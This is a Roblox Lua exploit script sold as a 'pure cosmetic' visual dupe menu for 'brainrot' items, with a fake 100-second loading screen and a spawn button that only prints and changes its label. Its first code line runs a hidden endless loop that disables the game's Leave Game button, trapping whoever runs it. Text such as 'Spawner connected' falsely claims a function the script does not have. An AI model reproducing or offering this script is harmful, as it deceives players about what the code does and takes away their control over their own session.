-- ============================================================
-- Visual Dupe Script — Loading Screen + Selection Menu
-- Pure cosmetic / client-side
-- ============================================================
task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer

-- ============================================================
-- Config
-- ============================================================
local CONFIG = {
    Title       = "Visual Dupe Script",
    Subtitle    = "Loading modules...",
    Brand       = "Zynn Hub",
    Version     = "v1.0",

    Features = {
        "Visual Spawner",
        "Brainrot Model Loader",
        "Mutation System",
        "Billboard Display",
        "Custom Income Tag",
        "Custom Price Tag",
        "Floating Animation",
        "Sparkle Particles",
        "Camera-Bound Render",
        "Drag UI System",
    },

    TotalLoadTime  = 100,
    AutoCloseDelay = 1.0,

    -- Daftar nama brainrot (list contoh — edit sesuai kebutuhan)
    Brainrots = {

    -- =========================
    -- OG Brainrots
    -- =========================
    "Strawberry Elephant",
    "Meowl",
    "Skibidi Toilet",

    -- =========================
    -- Top Tier Secret
    -- =========================
    "Dragon Gingerini",
    "Dragon Cannelloni",
    "Hydra Dragon Cannelloni",
    "Cerberus",
    "Rosey and Teddy",
    "Ketupat Bros",
    "Ginger Gerat",
    "La Supreme Combinasion",
    "Cooki and Milki",
    "Capitano Moby",
    "Los Primos",
    "Spooky and Pumpky",
    "Fragrama and Chocrama",
    "GOAT",
    "Griffin",

    -- =========================
    -- High Value Secrets
    -- =========================
    "Ketchuru and Musturu",
    "Los Mi Gatitos",
    "Graipuss Medussi",
    "Los Tralaleritos",
    "Noo My Examen",
    "La Vacca Saturno Saturnita",
    "Blackhole Goat",
    "Nuclearo Dinossauro",
    "Fishboard",
    "Los Matteos",

    -- =========================
    -- Rare OG/Event Secrets
    -- =========================
    "Easter Eggolas",
    "Chocone Dragone",
    "Bearini Plammini",
    "Fishini Mechinini",
    "Vulturino",
    "Alligarto",
    "La Crazy Combi",
    "Jishaoba Dashi",
},

    -- Daftar mutasi (list contoh)
    Mutations = {
        "Normal",
        "Gold",
        "Diamond",
        "Rainbow",
        "Lava",
        "Galaxy",
        "Bloodrot",
    },
}

-- ============================================================
-- Cleanup prior instances
-- ============================================================
for _, gui in ipairs(CoreGui:GetChildren()) do
    if gui.Name == "ZynnVisualDupeLoader" or gui.Name == "ZynnVisualDupeMenu" then
        gui:Destroy()
    end
end

-- ============================================================
-- Gradient helper
-- ============================================================
local function applyGradient(parent, colors, rotation)
    local g = Instance.new("UIGradient")
    local kp = {}
    for i, c in ipairs(colors) do
        table.insert(kp, ColorSequenceKeypoint.new((i - 1) / (#colors - 1), c))
    end
    g.Color = ColorSequence.new(kp)
    g.Rotation = rotation or 90
    g.Parent = parent
    return g
end

-- ============================================================
-- ============== LOADING SCREEN =============================
-- ============================================================
local LoaderGui = Instance.new("ScreenGui")
LoaderGui.Name = "ZynnVisualDupeLoader"
LoaderGui.ResetOnSpawn = false
LoaderGui.IgnoreGuiInset = true
LoaderGui.DisplayOrder = 1000
LoaderGui.Parent = CoreGui

local Backdrop = Instance.new("Frame")
Backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Backdrop.BackgroundTransparency = 0.15
Backdrop.BorderSizePixel = 0
Backdrop.Size = UDim2.new(1, 0, 1, 0)
Backdrop.Parent = LoaderGui
applyGradient(Backdrop, {
    Color3.fromRGB(15, 8, 25),
    Color3.fromRGB(20, 10, 35),
    Color3.fromRGB(10, 5, 20),
}, 135)

local Card = Instance.new("Frame")
Card.AnchorPoint = Vector2.new(0.5, 0.5)
Card.Position = UDim2.new(0.5, 0, 0.5, 0)
Card.Size = UDim2.new(0, 420, 0, 480)
Card.BackgroundColor3 = Color3.fromRGB(18, 12, 28)
Card.BorderSizePixel = 0
Card.Parent = LoaderGui
Instance.new("UICorner", Card).CornerRadius = UDim.new(0, 16)
applyGradient(Card, {
    Color3.fromRGB(25, 16, 40),
    Color3.fromRGB(35, 22, 55),
    Color3.fromRGB(22, 14, 35),
}, 135)

local CardStroke = Instance.new("UIStroke")
CardStroke.Color = Color3.fromRGB(170, 70, 255)
CardStroke.Thickness = 2
CardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
CardStroke.Parent = Card
applyGradient(CardStroke, {
    Color3.fromRGB(110, 40, 200),
    Color3.fromRGB(220, 150, 255),
    Color3.fromRGB(110, 40, 200),
}, 45)

local Brand = Instance.new("TextLabel")
Brand.BackgroundTransparency = 1
Brand.Position = UDim2.new(0, 24, 0, 22)
Brand.Size = UDim2.new(1, -48, 0, 22)
Brand.Font = Enum.Font.GothamBold
Brand.Text = CONFIG.Brand .. "  •  " .. CONFIG.Version
Brand.TextColor3 = Color3.fromRGB(200, 130, 255)
Brand.TextSize = 13
Brand.TextXAlignment = Enum.TextXAlignment.Left
Brand.Parent = Card

local Title = Instance.new("TextLabel")
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 24, 0, 48)
Title.Size = UDim2.new(1, -48, 0, 36)
Title.Font = Enum.Font.GothamBlack
Title.Text = CONFIG.Title
Title.TextColor3 = Color3.fromRGB(245, 230, 255)
Title.TextSize = 26
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Card
applyGradient(Title, {Color3.fromRGB(255, 255, 255), Color3.fromRGB(200, 130, 255)}, 90)

local Subtitle = Instance.new("TextLabel")
Subtitle.BackgroundTransparency = 1
Subtitle.Position = UDim2.new(0, 24, 0, 86)
Subtitle.Size = UDim2.new(1, -48, 0, 18)
Subtitle.Font = Enum.Font.Gotham
Subtitle.Text = CONFIG.Subtitle
Subtitle.TextColor3 = Color3.fromRGB(160, 140, 190)
Subtitle.TextSize = 13
Subtitle.TextXAlignment = Enum.TextXAlignment.Left
Subtitle.Parent = Card

local ListFrame = Instance.new("Frame")
ListFrame.BackgroundTransparency = 1
ListFrame.Position = UDim2.new(0, 24, 0, 124)
ListFrame.Size = UDim2.new(1, -48, 0, 280)
ListFrame.Parent = Card
local LL = Instance.new("UIListLayout", ListFrame)
LL.Padding = UDim.new(0, 6)
LL.SortOrder = Enum.SortOrder.LayoutOrder

local featureRows = {}
local function createFeatureRow(text, idx)
    local row = Instance.new("Frame")
    row.BackgroundColor3 = Color3.fromRGB(28, 18, 45)
    row.BackgroundTransparency = 0.3
    row.BorderSizePixel = 0
    row.Size = UDim2.new(1, 0, 0, 24)
    row.LayoutOrder = idx
    row.Parent = ListFrame
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)

    local Icon = Instance.new("TextLabel")
    Icon.BackgroundTransparency = 1
    Icon.Position = UDim2.new(0, 10, 0, 0)
    Icon.Size = UDim2.new(0, 18, 1, 0)
    Icon.Font = Enum.Font.GothamBold
    Icon.Text = "○"
    Icon.TextColor3 = Color3.fromRGB(120, 100, 150)
    Icon.TextSize = 14
    Icon.TextXAlignment = Enum.TextXAlignment.Left
    Icon.Parent = row

    local Label = Instance.new("TextLabel")
    Label.BackgroundTransparency = 1
    Label.Position = UDim2.new(0, 32, 0, 0)
    Label.Size = UDim2.new(1, -90, 1, 0)
    Label.Font = Enum.Font.GothamMedium
    Label.Text = text
    Label.TextColor3 = Color3.fromRGB(170, 150, 200)
    Label.TextSize = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = row

    local Status = Instance.new("TextLabel")
    Status.BackgroundTransparency = 1
    Status.AnchorPoint = Vector2.new(1, 0)
    Status.Position = UDim2.new(1, -10, 0, 0)
    Status.Size = UDim2.new(0, 70, 1, 0)
    Status.Font = Enum.Font.GothamBold
    Status.Text = "WAIT"
    Status.TextColor3 = Color3.fromRGB(120, 100, 150)
    Status.TextSize = 10
    Status.TextXAlignment = Enum.TextXAlignment.Right
    Status.Parent = row

    return {row=row, icon=Icon, label=Label, status=Status}
end

for i, fn in ipairs(CONFIG.Features) do
    featureRows[i] = createFeatureRow(fn, i)
end

local BarBg = Instance.new("Frame")
BarBg.BackgroundColor3 = Color3.fromRGB(28, 18, 45)
BarBg.BorderSizePixel = 0
BarBg.Position = UDim2.new(0, 24, 1, -64)
BarBg.Size = UDim2.new(1, -48, 0, 8)
BarBg.Parent = Card
Instance.new("UICorner", BarBg).CornerRadius = UDim.new(1, 0)

local BarFill = Instance.new("Frame")
BarFill.BackgroundColor3 = Color3.fromRGB(170, 70, 255)
BarFill.BorderSizePixel = 0
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.Parent = BarBg
Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1, 0)
applyGradient(BarFill, {
    Color3.fromRGB(110, 40, 200),
    Color3.fromRGB(170, 70, 255),
    Color3.fromRGB(220, 150, 255),
}, 0)

local PercentLabel = Instance.new("TextLabel")
PercentLabel.BackgroundTransparency = 1
PercentLabel.Position = UDim2.new(0, 24, 1, -36)
PercentLabel.Size = UDim2.new(1, -48, 0, 18)
PercentLabel.Font = Enum.Font.GothamBold
PercentLabel.Text = "0%"
PercentLabel.TextColor3 = Color3.fromRGB(200, 130, 255)
PercentLabel.TextSize = 12
PercentLabel.TextXAlignment = Enum.TextXAlignment.Left
PercentLabel.Parent = Card

local StatusLabel = Instance.new("TextLabel")
StatusLabel.BackgroundTransparency = 1
StatusLabel.Position = UDim2.new(0, 24, 1, -36)
StatusLabel.Size = UDim2.new(1, -48, 0, 18)
StatusLabel.Font = Enum.Font.GothamMedium
StatusLabel.Text = "Initializing..."
StatusLabel.TextColor3 = Color3.fromRGB(160, 140, 190)
StatusLabel.TextSize = 11
StatusLabel.TextXAlignment = Enum.TextXAlignment.Right
StatusLabel.Parent = Card

local spinnerActive = nil
local spinnerStart = 0
local spinnerConn = RunService.Heartbeat:Connect(function()
    if not spinnerActive then return end
    local t = tick() - spinnerStart
    local frames = {"◐", "◓", "◑", "◒"}
    local idx = (math.floor(t * 6) % #frames) + 1
    spinnerActive.icon.Text = frames[idx]
end)

Card.Size = UDim2.new(0, 420, 0, 0)
Card.BackgroundTransparency = 1
Backdrop.BackgroundTransparency = 1
TweenService:Create(Backdrop, TweenInfo.new(0.35, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.15}):Play()
TweenService:Create(Card, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 420, 0, 480),
    BackgroundTransparency = 0
}):Play()

task.wait(0.5)

local stepTime = CONFIG.TotalLoadTime / #CONFIG.Features
for i, feat in ipairs(featureRows) do
    spinnerActive = feat
    spinnerStart = tick()
    feat.status.Text = "LOADING"
    feat.status.TextColor3 = Color3.fromRGB(220, 150, 255)
    TweenService:Create(feat.label, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(230, 210, 255)}):Play()
    TweenService:Create(feat.row, TweenInfo.new(0.2), {BackgroundTransparency = 0.1, BackgroundColor3 = Color3.fromRGB(45, 25, 70)}):Play()

    StatusLabel.Text = "Loading: " .. CONFIG.Features[i]
    local pFrom = (i - 1) / #CONFIG.Features
    local pTo   = i / #CONFIG.Features
    local stepStart = tick()
    while tick() - stepStart < stepTime do
        local lt = (tick() - stepStart) / stepTime
        local p = pFrom + (pTo - pFrom) * lt
        BarFill.Size = UDim2.new(p, 0, 1, 0)
        PercentLabel.Text = string.format("%d%%", math.floor(p * 100))
        RunService.Heartbeat:Wait()
    end

    spinnerActive = nil
    feat.icon.Text = "✓"
    feat.icon.TextColor3 = Color3.fromRGB(120, 255, 160)
    feat.status.Text = "OK"
    feat.status.TextColor3 = Color3.fromRGB(120, 255, 160)
    TweenService:Create(feat.row, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(28, 18, 45), BackgroundTransparency = 0.3
    }):Play()
end

BarFill.Size = UDim2.new(1, 0, 1, 0)
PercentLabel.Text = "100%"
StatusLabel.Text = "Ready"
StatusLabel.TextColor3 = Color3.fromRGB(120, 255, 160)
Subtitle.Text = "All modules loaded successfully"

if spinnerConn then spinnerConn:Disconnect() end

task.wait(CONFIG.AutoCloseDelay)

TweenService:Create(Card, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
    Size = UDim2.new(0, 420, 0, 0), BackgroundTransparency = 1
}):Play()
TweenService:Create(Backdrop, TweenInfo.new(0.35, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()

task.wait(0.4)
LoaderGui:Destroy()

-- ============================================================
-- ============== SELECTION MENU =============================
-- ============================================================
local MenuGui = Instance.new("ScreenGui")
MenuGui.Name = "ZynnVisualDupeMenu"
MenuGui.ResetOnSpawn = false
MenuGui.IgnoreGuiInset = true
MenuGui.DisplayOrder = 999
MenuGui.Parent = CoreGui

local MenuCard = Instance.new("Frame")
MenuCard.AnchorPoint = Vector2.new(0.5, 0.5)
MenuCard.Position = UDim2.new(0.5, 0, 0.5, 0)
MenuCard.Size = UDim2.new(0, 380, 0, 430)
MenuCard.BackgroundColor3 = Color3.fromRGB(18, 12, 28)
MenuCard.BorderSizePixel = 0
MenuCard.Active = true
MenuCard.ClipsDescendants = false
MenuCard.Parent = MenuGui
Instance.new("UICorner", MenuCard).CornerRadius = UDim.new(0, 14)
applyGradient(MenuCard, {
    Color3.fromRGB(25, 16, 40),
    Color3.fromRGB(35, 22, 55),
    Color3.fromRGB(22, 14, 35),
}, 135)

local MenuStroke = Instance.new("UIStroke")
MenuStroke.Color = Color3.fromRGB(170, 70, 255)
MenuStroke.Thickness = 2
MenuStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MenuStroke.Parent = MenuCard
applyGradient(MenuStroke, {
    Color3.fromRGB(110, 40, 200),
    Color3.fromRGB(220, 150, 255),
    Color3.fromRGB(110, 40, 200),
}, 45)

local MenuBrand = Instance.new("TextLabel")
MenuBrand.BackgroundTransparency = 1
MenuBrand.Position = UDim2.new(0, 20, 0, 16)
MenuBrand.Size = UDim2.new(1, -90, 0, 16)
MenuBrand.Font = Enum.Font.GothamBold
MenuBrand.Text = CONFIG.Brand .. "  •  " .. CONFIG.Version
MenuBrand.TextColor3 = Color3.fromRGB(200, 130, 255)
MenuBrand.TextSize = 12
MenuBrand.TextXAlignment = Enum.TextXAlignment.Left
MenuBrand.Parent = MenuCard

local MenuTitle = Instance.new("TextLabel")
MenuTitle.BackgroundTransparency = 1
MenuTitle.Position = UDim2.new(0, 20, 0, 36)
MenuTitle.Size = UDim2.new(1, -90, 0, 28)
MenuTitle.Font = Enum.Font.GothamBlack
MenuTitle.Text = "Visual Dupe Menu"
MenuTitle.TextColor3 = Color3.fromRGB(245, 230, 255)
MenuTitle.TextSize = 20
MenuTitle.TextXAlignment = Enum.TextXAlignment.Left
MenuTitle.Parent = MenuCard
applyGradient(MenuTitle, {Color3.fromRGB(255, 255, 255), Color3.fromRGB(200, 130, 255)}, 90)

local CloseBtn = Instance.new("TextButton")
CloseBtn.AutoButtonColor = false
CloseBtn.AnchorPoint = Vector2.new(1, 0)
CloseBtn.Position = UDim2.new(1, -16, 0, 16)
CloseBtn.Size = UDim2.new(0, 28, 0, 28)
CloseBtn.BackgroundColor3 = Color3.fromRGB(35, 22, 50)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(200, 180, 230)
CloseBtn.TextSize = 14
CloseBtn.Parent = MenuCard
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)
local CloseStroke = Instance.new("UIStroke", CloseBtn)
CloseStroke.Color = Color3.fromRGB(110, 40, 200)
CloseStroke.Thickness = 1
CloseStroke.Transparency = 0.4

CloseBtn.MouseEnter:Connect(function()
    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 30, 100)}):Play()
end)
CloseBtn.MouseLeave:Connect(function()
    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(35, 22, 50)}):Play()
end)

local selectedBrainrot = CONFIG.Brainrots[1]
local selectedMutation = CONFIG.Mutations[1]

-- ============================================================
-- Dropdown component
-- ============================================================
local activeDropdown = nil

local function createDropdown(parent, labelText, options, posY, onSelect, defaultValue, zBase)
    local sectionLabel = Instance.new("TextLabel")
    sectionLabel.BackgroundTransparency = 1
    sectionLabel.Position = UDim2.new(0, 20, 0, posY)
    sectionLabel.Size = UDim2.new(1, -40, 0, 16)
    sectionLabel.Font = Enum.Font.GothamBold
    sectionLabel.Text = labelText
    sectionLabel.TextColor3 = Color3.fromRGB(180, 160, 210)
    sectionLabel.TextSize = 12
    sectionLabel.TextXAlignment = Enum.TextXAlignment.Left
    sectionLabel.ZIndex = zBase
    sectionLabel.Parent = parent

    local DropBtn = Instance.new("TextButton")
    DropBtn.AutoButtonColor = false
    DropBtn.Position = UDim2.new(0, 20, 0, posY + 20)
    DropBtn.Size = UDim2.new(1, -40, 0, 38)
    DropBtn.BackgroundColor3 = Color3.fromRGB(28, 18, 45)
    DropBtn.BorderSizePixel = 0
    DropBtn.Font = Enum.Font.GothamMedium
    DropBtn.Text = ""
    DropBtn.ZIndex = zBase
    DropBtn.Parent = parent
    Instance.new("UICorner", DropBtn).CornerRadius = UDim.new(0, 8)
    local DropStroke = Instance.new("UIStroke", DropBtn)
    DropStroke.Color = Color3.fromRGB(110, 40, 200)
    DropStroke.Thickness = 1
    DropStroke.Transparency = 0.4

    local SelText = Instance.new("TextLabel")
    SelText.BackgroundTransparency = 1
    SelText.Position = UDim2.new(0, 12, 0, 0)
    SelText.Size = UDim2.new(1, -42, 1, 0)
    SelText.Font = Enum.Font.GothamMedium
    SelText.Text = defaultValue
    SelText.TextColor3 = Color3.fromRGB(230, 220, 250)
    SelText.TextSize = 13
    SelText.TextXAlignment = Enum.TextXAlignment.Left
    SelText.TextTruncate = Enum.TextTruncate.AtEnd
    SelText.ZIndex = zBase + 1
    SelText.Parent = DropBtn

    local Arrow = Instance.new("TextLabel")
    Arrow.BackgroundTransparency = 1
    Arrow.AnchorPoint = Vector2.new(1, 0.5)
    Arrow.Position = UDim2.new(1, -12, 0.5, 0)
    Arrow.Size = UDim2.new(0, 18, 0, 18)
    Arrow.Font = Enum.Font.GothamBold
    Arrow.Text = "▾"
    Arrow.TextColor3 = Color3.fromRGB(200, 130, 255)
    Arrow.TextSize = 14
    Arrow.ZIndex = zBase + 1
    Arrow.Parent = DropBtn

    local ListContainer = Instance.new("Frame")
    ListContainer.BackgroundColor3 = Color3.fromRGB(22, 14, 36)
    ListContainer.BorderSizePixel = 0
    ListContainer.Position = UDim2.new(0, 20, 0, posY + 62)
    ListContainer.Size = UDim2.new(1, -40, 0, 0)
    ListContainer.ClipsDescendants = true
    ListContainer.Visible = false
    ListContainer.ZIndex = zBase + 10
    ListContainer.Parent = parent
    Instance.new("UICorner", ListContainer).CornerRadius = UDim.new(0, 8)
    local ListStroke = Instance.new("UIStroke", ListContainer)
    ListStroke.Color = Color3.fromRGB(110, 40, 200)
    ListStroke.Thickness = 1
    ListStroke.Transparency = 0.3

    local Scroll = Instance.new("ScrollingFrame")
    Scroll.BackgroundTransparency = 1
    Scroll.BorderSizePixel = 0
    Scroll.Size = UDim2.new(1, 0, 1, 0)
    Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    Scroll.ScrollBarThickness = 4
    Scroll.ScrollBarImageColor3 = Color3.fromRGB(170, 70, 255)
    Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    Scroll.ZIndex = zBase + 11
    Scroll.Parent = ListContainer

    local InnerLayout = Instance.new("UIListLayout", Scroll)
    InnerLayout.Padding = UDim.new(0, 2)
    InnerLayout.SortOrder = Enum.SortOrder.LayoutOrder

    local Padding = Instance.new("UIPadding", Scroll)
    Padding.PaddingTop = UDim.new(0, 4)
    Padding.PaddingBottom = UDim.new(0, 4)
    Padding.PaddingLeft = UDim.new(0, 4)
    Padding.PaddingRight = UDim.new(0, 4)

    local targetHeight = math.min(#options * 32 + 8, 150)

    local function closeDrop()
        TweenService:Create(Arrow, TweenInfo.new(0.18), {Rotation = 0}):Play()
        TweenService:Create(ListContainer, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
            Size = UDim2.new(1, -40, 0, 0)
        }):Play()
        task.delay(0.2, function()
            if ListContainer.Size.Y.Offset <= 1 then
                ListContainer.Visible = false
            end
        end)
        if activeDropdown == ListContainer then
            activeDropdown = nil
        end
    end

    local function openDrop()
        if activeDropdown and activeDropdown ~= ListContainer then
            local prev = activeDropdown
            activeDropdown = nil
            TweenService:Create(prev, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
                Size = UDim2.new(1, -40, 0, 0)
            }):Play()
            task.delay(0.2, function()
                prev.Visible = false
            end)
        end
        ListContainer.Visible = true
        ListContainer.Size = UDim2.new(1, -40, 0, 0)
        TweenService:Create(Arrow, TweenInfo.new(0.18), {Rotation = 180}):Play()
        TweenService:Create(ListContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            Size = UDim2.new(1, -40, 0, targetHeight)
        }):Play()
        activeDropdown = ListContainer
    end

    for idx, optName in ipairs(options) do
        local OptBtn = Instance.new("TextButton")
        OptBtn.AutoButtonColor = false
        OptBtn.BackgroundColor3 = Color3.fromRGB(30, 20, 48)
        OptBtn.BackgroundTransparency = 0.3
        OptBtn.BorderSizePixel = 0
        OptBtn.Size = UDim2.new(1, 0, 0, 30)
        OptBtn.Font = Enum.Font.GothamMedium
        OptBtn.Text = optName
        OptBtn.TextColor3 = Color3.fromRGB(220, 200, 240)
        OptBtn.TextSize = 12
        OptBtn.TextXAlignment = Enum.TextXAlignment.Left
        OptBtn.LayoutOrder = idx
        OptBtn.ZIndex = zBase + 12
        OptBtn.Parent = Scroll
        Instance.new("UICorner", OptBtn).CornerRadius = UDim.new(0, 6)

        local optPad = Instance.new("UIPadding", OptBtn)
        optPad.PaddingLeft = UDim.new(0, 10)

        OptBtn.MouseEnter:Connect(function()
            TweenService:Create(OptBtn, TweenInfo.new(0.12), {
                BackgroundColor3 = Color3.fromRGB(70, 40, 110),
                BackgroundTransparency = 0
            }):Play()
        end)
        OptBtn.MouseLeave:Connect(function()
            TweenService:Create(OptBtn, TweenInfo.new(0.12), {
                BackgroundColor3 = Color3.fromRGB(30, 20, 48),
                BackgroundTransparency = 0.3
            }):Play()
        end)

        OptBtn.MouseButton1Click:Connect(function()
            SelText.Text = optName
            onSelect(optName)
            closeDrop()
        end)
    end

    DropBtn.MouseButton1Click:Connect(function()
        if ListContainer.Visible and activeDropdown == ListContainer then
            closeDrop()
        else
            openDrop()
        end
    end)

    DropBtn.MouseEnter:Connect(function()
        TweenService:Create(DropStroke, TweenInfo.new(0.15), {Transparency = 0.1}):Play()
    end)
    DropBtn.MouseLeave:Connect(function()
        TweenService:Create(DropStroke, TweenInfo.new(0.15), {Transparency = 0.4}):Play()
    end)
end

-- Info row (selection display)
local InfoRow = Instance.new("Frame")
InfoRow.BackgroundColor3 = Color3.fromRGB(28, 18, 45)
InfoRow.BackgroundTransparency = 0.3
InfoRow.BorderSizePixel = 0
InfoRow.Position = UDim2.new(0, 20, 1, -76)
InfoRow.Size = UDim2.new(1, -40, 0, 56)
InfoRow.ZIndex = 1
InfoRow.Parent = MenuCard
Instance.new("UICorner", InfoRow).CornerRadius = UDim.new(0, 8)

local InfoTitle = Instance.new("TextLabel")
InfoTitle.BackgroundTransparency = 1
InfoTitle.Position = UDim2.new(0, 12, 0, 6)
InfoTitle.Size = UDim2.new(1, -24, 0, 16)
InfoTitle.Font = Enum.Font.GothamBold
InfoTitle.Text = "Current Selection"
InfoTitle.TextColor3 = Color3.fromRGB(180, 160, 210)
InfoTitle.TextSize = 11
InfoTitle.TextXAlignment = Enum.TextXAlignment.Left
InfoTitle.Parent = InfoRow

local InfoValue = Instance.new("TextLabel")
InfoValue.BackgroundTransparency = 1
InfoValue.Position = UDim2.new(0, 12, 0, 24)
InfoValue.Size = UDim2.new(1, -24, 0, 22)
InfoValue.Font = Enum.Font.GothamMedium
InfoValue.Text = selectedBrainrot .. "  •  " .. selectedMutation
InfoValue.TextColor3 = Color3.fromRGB(240, 220, 255)
InfoValue.TextSize = 13
InfoValue.TextXAlignment = Enum.TextXAlignment.Left
InfoValue.TextTruncate = Enum.TextTruncate.AtEnd
InfoValue.Parent = InfoRow

local function refreshInfo()
    InfoValue.Text = selectedBrainrot .. "  •  " .. selectedMutation
end

-- Brainrot dropdown (higher z so its list overlaps mutation row when open)
createDropdown(MenuCard, "Brainrot", CONFIG.Brainrots, 80, function(value)
    selectedBrainrot = value
    refreshInfo()
    print("[Zynn] Selected Brainrot:", value)
end, selectedBrainrot, 50)

-- Mutation dropdown (lower z, but its list will pop above the info row)
createDropdown(MenuCard, "Mutation", CONFIG.Mutations, 168, function(value)
    selectedMutation = value
    refreshInfo()
    print("[Zynn] Selected Mutation:", value)
end, selectedMutation, 20)

-- ============================================================
-- Spawn Button
-- ============================================================
local SpawnBtn = Instance.new("TextButton")
SpawnBtn.AutoButtonColor = false
SpawnBtn.Position = UDim2.new(0, 20, 0, 258)
SpawnBtn.Size = UDim2.new(1, -40, 0, 42)
SpawnBtn.BackgroundColor3 = Color3.fromRGB(80, 35, 130)
SpawnBtn.BorderSizePixel = 0
SpawnBtn.Font = Enum.Font.GothamBold
SpawnBtn.Text = "SPAWN VISUAL"
SpawnBtn.TextColor3 = Color3.fromRGB(255,255,255)
SpawnBtn.TextSize = 14
SpawnBtn.Parent = MenuCard

Instance.new("UICorner", SpawnBtn).CornerRadius = UDim.new(0, 10)

local SpawnStroke = Instance.new("UIStroke")
SpawnStroke.Color = Color3.fromRGB(180, 90, 255)
SpawnStroke.Thickness = 1.5
SpawnStroke.Parent = SpawnBtn

applyGradient(SpawnBtn,{
    Color3.fromRGB(90,40,150),
    Color3.fromRGB(170,70,255),
    Color3.fromRGB(120,50,200),
},0)

SpawnBtn.MouseEnter:Connect(function()
    TweenService:Create(SpawnBtn,TweenInfo.new(0.15),{
        Size = UDim2.new(1,-36,0,44)
    }):Play()
end)

SpawnBtn.MouseLeave:Connect(function()
    TweenService:Create(SpawnBtn,TweenInfo.new(0.15),{
        Size = UDim2.new(1,-40,0,42)
    }):Play()
end)

SpawnBtn.MouseButton1Click:Connect(function()

    print("[Zynn] Spawn pressed")
    print("[Zynn] Brainrot:", selectedBrainrot)
    print("[Zynn] Mutation:", selectedMutation)

    SpawnBtn.Text = "SPAWNING..."

    TweenService:Create(SpawnBtn,TweenInfo.new(0.2),{
        BackgroundColor3 = Color3.fromRGB(120,60,200)
    }):Play()

    task.wait(1)

    SpawnBtn.Text = "SPAWNED ✓"

    task.wait(1.2)

    SpawnBtn.Text = "SPAWN VISUAL"

    TweenService:Create(SpawnBtn,TweenInfo.new(0.2),{
        BackgroundColor3 = Color3.fromRGB(80,35,130)
    }):Play()
end)

-- Hint
local HintLabel = Instance.new("TextLabel")
HintLabel.BackgroundTransparency = 1
HintLabel.Position = UDim2.new(0, 20, 1, -18)
HintLabel.Size = UDim2.new(1, -40, 0, 14)
HintLabel.Font = Enum.Font.Gotham
HintLabel.Text = "Drag menu to move • 🟢 Spawner connected"
HintLabel.TextColor3 = Color3.fromRGB(130, 110, 160)
HintLabel.TextSize = 10
HintLabel.TextXAlignment = Enum.TextXAlignment.Left
HintLabel.Parent = MenuCard

CloseBtn.MouseButton1Click:Connect(function()
    TweenService:Create(MenuCard, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
        Size = UDim2.new(0, 380, 0, 0),
        BackgroundTransparency = 1
    }):Play()
    task.wait(0.28)
    MenuGui:Destroy()
end)

-- Drag menu
local dragging, dragStart, startPos
MenuCard.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MenuCard.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
                  or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MenuCard.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- Entrance animation
MenuCard.Size = UDim2.new(0, 380, 0, 0)
MenuCard.BackgroundTransparency = 1
TweenService:Create(MenuCard, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 380, 0, 430),
    BackgroundTransparency = 0
}):Play()

print("[Zynn] Visual Dupe Menu opened.")
print("[Zynn] Brainrots:", #CONFIG.Brainrots, "options.")
print("[Zynn] Mutations:", #CONFIG.Mutations, "options.")
